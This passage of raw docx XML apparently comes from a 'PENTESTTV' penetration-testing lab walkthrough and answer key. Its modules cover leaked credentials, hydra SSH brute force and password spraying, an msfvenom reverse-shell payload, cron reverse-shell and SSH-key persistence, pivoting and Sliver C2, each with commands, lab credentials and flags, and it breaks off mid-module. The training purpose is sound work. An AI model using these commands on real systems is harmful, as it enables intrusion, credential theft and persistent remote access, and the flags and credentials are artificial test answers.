        <w:t>The current config.py looks clean; the first commit of config.py contains the API_KEY (the flag) and DB_PASS=Wint3rGarden!99.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>The Jenkinsfile holds hardcoded deploy creds (DEPLOY_PASS=D3ployP@ss2024).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t xml:space="preserve">Flag: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>PENTESTTV{secrets_live_forever_in_git_history} (STATIC, the API_KEY value).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>16. Credentials in the Wiki</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Chapter: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>6</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MODULE_ENT_WIKI_FLAG</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C9D2DA"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">   ·   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Zone: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Internal</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Read the IT Operations Runbook and recover the operations credential and the change-control token.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Target link: http://localhost:8084</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Commands (run in Kali)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># browser or curl:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl http://172.28.20.132/it-runbook.html    # or http://localhost:8084</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Expected result</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>The runbook exposes the jump-host ops account opsadmin / OpsTransit#2024 and a change-control token.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Keep the opsadmin credential: it is the way into the restricted segment (module 33).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t xml:space="preserve">Flag: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>PENTESTTV{wiki_pages_leak_operational_creds} (STATIC).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>17. Password Attack (SSH)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Chapter: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>9</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MODULE_07B_PW_FLAG</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C9D2DA"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">   ·   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Zone: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Internal</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Recover the username jsmith from what the network leaks, then brute force its SSH password.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Commands (run in Kali)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># find the username first</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>smbclient //172.28.20.60/data -N           # get helpdesk-notes.txt -&gt; names jsmith</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>snmpwalk -v2c -c public 172.28.20.40 sysContact   # also returns jsmith@pentesttv.local</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># confirm SSH and attack</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>nmap -p22 172.28.20.50</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>hydra -l jsmith -P /usr/share/wordlists/lab-passwords.txt -t 4 ssh://172.28.20.50</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>ssh jsmith@172.28.20.50</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>cat ~/loot/pwattack_flag.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Expected result</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>hydra recovers jsmith’s password: Password1 (early in the lab wordlist).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>pwattack_flag.txt is readable only after a successful SSH login.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t xml:space="preserve">Flag: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>a PENTESTTV{32-hex} value, random per deploy. Validated by the scoreboard; the live value is recorded in flags.generated.env.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>This jsmith / Password1 credential is reused by the C2, persistence, and local-privesc modules.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>18. Password Spraying</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Chapter: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>9</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MODULE_07G_SPRAY_FLAG</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C9D2DA"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">   ·   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Zone: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Internal</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Spray one seasonal password across the user list and find the account that reused it.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Commands (run in Kali)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>hydra -L /usr/share/wordlists/lab-users.txt -p 'Autumn2024' ssh://172.28.20.50</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>ssh pmorgan@172.28.20.50</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>cat ~/loot/spray_flag.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Expected result</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>The spray lands on pmorgan (password Autumn2024).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>spray_flag.txt is in pmorgan’s loot folder.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t xml:space="preserve">Flag: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>a PENTESTTV{32-hex} value, random per deploy. Validated by the scoreboard; the live value is recorded in flags.generated.env.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>19. Weaponization and Payload Delivery (msfvenom)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Chapter: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>7</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MODULE_08A_MSF_FLAG</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C9D2DA"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">   ·   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Zone: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Internal</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Build a reverse-shell payload, drop it on the ws-03 writable share, and catch the session.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Commands (run in Kali)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=172.28.20.10 LPORT=4444 -f elf -o payload.elf</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>msfconsole -q -x 'use exploit/multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set LHOST 172.28.20.10; set LPORT 4444; run'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># in a second shell, deliver it:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>smbclient //172.28.20.70/drop -N -c 'put payload.elf'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># the victim runs it within ~20s; in the Meterpreter session:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>cat /home/victim/loot/user_flag.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Expected result</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>ws-03 (172.28.20.70) executes whatever lands in //drop as the victim user every ~20s.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Your handler catches a Meterpreter session; user_flag.txt is in the victim’s loot.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t xml:space="preserve">Flag: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>a PENTESTTV{32-hex} value, random per deploy. Validated by the scoreboard; the live value is recorded in flags.generated.env.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>20. Installation and Persistence</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Chapter: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>10</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C9D2DA"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">   ·   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Grading: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>manual</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C9D2DA"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">   ·   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Zone: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Internal</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Establish re-entry to the internal workstation that survives a reboot without re-exploiting it.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Commands (run in Kali)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>ssh jsmith@172.28.20.50                    # password Password1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># option A: cron callback</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>(crontab -l 2&gt;/dev/null; echo '*/5 * * * * /bin/bash -c "bash -i &gt;&amp; /dev/tcp/172.28.10.10/4444 0&gt;&amp;1"') | crontab -</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># option B: drop your public key</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>mkdir -p ~/.ssh &amp;&amp; echo "&lt;your-pubkey&gt;" &gt;&gt; ~/.ssh/authorized_keys</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Expected result</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>The cron callback returns to a listener on your Kali box, or the key allows password-less re-entry.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Manual module: confirm re-entry works, then mark done on the scoreboard.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Container caveat: containers have no real init, so persistence is lower fidelity than on a VM. For full fidelity run this against the VM target.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>21. Command and Control</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Chapter: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>11</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MODULE_09_C2_FLAG</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C9D2DA"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">   ·   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Zone: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Internal</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Route through the host you control to operate against the internal segment and read the staged flag.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Commands (run in Kali)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># in your Metasploit session on the DMZ target (dual-homed to 172.28.20.0/24):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>run autoroute -s 172.28.20.0/24            # or set up an SSH dynamic SOCKS proxy</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># then reach the internal pivot:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>ssh jsmith@172.28.20.50                    # password Password1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>cat /home/jsmith/loot/c2_flag.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Expected result</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Pivoting/autoroute reaches 172.28.20.0/24 through the foothold.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>c2_flag.txt is in jsmith’s loot.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t xml:space="preserve">Flag: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>a PENTESTTV{32-hex} value, random per deploy. Validated by the scoreboard; the live value is recorded in flags.generated.env.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Kali is also directly on the internal network, so .20.50 is reachable without the pivot; pivoting is the method being taught.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>22. Command and Control (Sliver)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Chapter: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>11</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MODULE_09D_SLIVER_FLAG</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C9D2DA"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">   ·   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Zone: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Internal</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Operate through the Sliver C2 server: import the operator config, generate an implant, deliver it, pull the flag through the beacon.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Commands (run in Kali)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>sliver import /c2/operator.cfg</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>sliver                                     # launch client, connects to c2-01</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># in the Sliver console:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>mtls                                       # listener on default 8888, all interfaces</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
